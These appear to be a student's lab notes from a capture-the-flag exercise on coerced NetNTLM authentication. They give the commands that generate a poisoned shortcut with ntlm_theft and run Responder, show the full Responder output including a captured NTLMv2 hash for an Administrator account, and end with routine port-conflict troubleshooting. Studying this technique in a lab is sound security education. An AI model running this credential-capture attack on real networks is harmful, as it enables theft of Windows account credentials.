

Usage for NetNTLM coerced authentication:
```
python3 ntlm_theft.py -g lnk -s 10.8.1.167 -f stealthy           // Using https://github.com/Greenwolf/ntlm_theft to generate a poisoned shortcut file for a target to click on, making them attempt to connect to our system.
responder -I tun0
```
##### responder output:
```
┌─[✗]─[root@edu-virtualbox]─[/tmp]
└──╼ #responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [OFF]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.8.1.167]
    Responder IPv6             [fe80::eb56:1a62:ce6d:daea]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']

[+] Current Session Variables:
    Responder Machine Name     [WIN-LX1COFHUR4A]
    Responder Domain Name      [N6JC.LOCAL]
    Responder DCE-RPC Port     [45533]

[+] Listening for events...

[!] Error starting TCP server on port 1883, check permissions or other servers running.
[!] Error starting TCP server on port 53, check permissions or other servers running.
[SMB] NTLMv2-SSP Client   : 10.10.27.118
[SMB] NTLMv2-SSP Username : ELFHQSERVER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::ELFHQSERVER:66cb6dcdbc66ad72:2C3D62867A26F268C6B7A1B7F7A2C9A4:010100000000000000F71806B936DA017138201B5FF1A50000000000020008004E0036004A00430001001E00570049004E002D004C005800310043004F0046004800550052003400410004003400570049004E002D004C005800310043004F004600480055005200340041002E004E0036004A0043002E004C004F00430041004C00030014004E0036004A0043002E004C004F00430041004C00050014004E0036004A0043002E004C004F00430041004C000700080000F71806B936DA010600040002000000080030003000000000000000000000000030000083B872B978E45D895491A86BFACA8B8F91F0235CCBC785DBFB41903C57E891D10A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E0038002E0031002E003100360037000000000000000000
[*] Skipping previously captured hash for ELFHQSERVER\Administrator
```


#### General troubleshooting: "Error starting on port"
Note: port 53 is a DNS server, and shouldn't be killed unless absolutely necessary.
Example Responder output:
```
[!] Error starting TCP server on port 3389, check permissions or other servers running.
[!] Error starting TCP server on port 1883, check permissions or other servers running.
[!] Error starting TCP server on port 53, check permissions or other servers running.
```
To check (and kill) the services running on these ports:
First, check if the port is listening:
```
┌─[root@edu-virtualbox]─[.../edu/THM]
└──╼ #netstat -ano | grep 1883                  
tcp        0      0 127.0.0.1:1883          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp6       0      0 ::1:1883                :::*                    LISTEN      off (0.00/0/0)
tcp6       0      0 ::1:1883                ::1:34345               ESTABLISHED off (0.00/0/0)
tcp6       0      0 ::1:34345               ::1:1883                ESTABLISHED off (0.00/0/0)
```
Check the PID of the process listening on the port:
```
┌─[root@edu-virtualbox]─[.../edu/THM]
└──╼ #fuser 1883/tcp                                     
1883/tcp:             1164
```
Check the running services and PIDs in use:
```
┌─[✗]─[root@edu-virtualbox]─[.../edu/THM]
└──╼ #lsof -i4
COMMAND     PID      USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
systemd       1      root   35u  IPv4  20766      0t0  TCP *:sunrpc (LISTEN)
systemd       1      root   36u  IPv4  14809      0t0  UDP *:sunrpc 
NetworkMa   618      root   26u  IPv4  25464      0t0  UDP 10.0.2.15:bootpc->10.0.2.2:bootps 
rpcbind    1146      _rpc    4u  IPv4  20766      0t0  TCP *:sunrpc (LISTEN)
rpcbind    1146      _rpc    5u  IPv4  14809      0t0  UDP *:sunrpc 
container  1159      root   11u  IPv4  27081      0t0  TCP localhost:44503 (LISTEN)
mosquitto  1164 mosquitto    5u  IPv4  26278      0t0  TCP localhost:1883 (LISTEN)             // This uses port 1883 and has PID 1164
rpc.statd  1166     statd    5u  IPv4  26684      0t0  UDP localhost:918 
rpc.statd  1166     statd    8u  IPv4  26700      0t0  UDP *:34518 
rpc.statd  1166     statd    9u  IPv4  26705      0t0  TCP *:49529 (LISTEN)
rpc.mount  1167      root    4u  IPv4  26710      0t0  UDP *:58265 
rpc.mount  1167      root    5u  IPv4  26720      0t0  TCP *:51515 (LISTEN)
rpc.mount  1167      root    8u  IPv4  26733      0t0  UDP *:33533 
rpc.mount  1167      root    9u  IPv4  26736      0t0  TCP *:47677 (LISTEN)
rpc.mount  1167      root   12u  IPv4  26745      0t0  UDP *:50713 
rpc.mount  1167      root   13u  IPv4  26748      0t0  TCP *:56725 (LISTEN)
dnsmasq    1344   dnsmasq    4u  IPv4  26435      0t0  UDP *:bootps 
dnsmasq    1344   dnsmasq    6u  IPv4  26438      0t0  UDP 10.0.3.1:domain 
dnsmasq    1344   dnsmasq    7u  IPv4  26439      0t0  TCP 10.0.3.1:domain (LISTEN)
mariadbd   1424     mysql   20u  IPv4  26594      0t0  TCP localhost:mysql (LISTEN)
postgres   1435  postgres    6u  IPv4  26520      0t0  TCP localhost:5433 (LISTEN)
postgres   1456  postgres    6u  IPv4  27093      0t0  TCP localhost:postgresql (LISTEN)
ospd-open  1811      _gvm    9u  IPv4  30611      0t0  TCP localhost:53392->localhost:38223 (ESTABLISHED)
ospd-open  1811      _gvm   10u  IPv4  30612      0t0  TCP localhost:38223->localhost:53392 (ESTABLISHED)
ospd-open  1820      _gvm    9u  IPv4  30611      0t0  TCP localhost:53392->localhost:38223 (ESTABLISHED)
ospd-open  1820      _gvm   10u  IPv4  30612      0t0  TCP localhost:38223->localhost:53392 (ESTABLISHED)
openvpn   16758      root    3u  IPv4  74186      0t0  UDP *:48391 
```
The process using port 1164 is `mosquitto`.
To stop it, use 
```
┌─[root@edu-virtualbox]─[.../edu/THM]
└──╼ #systemctl stop mosquitto
```
If a non-service process is using the port, use
```
kill PID
```
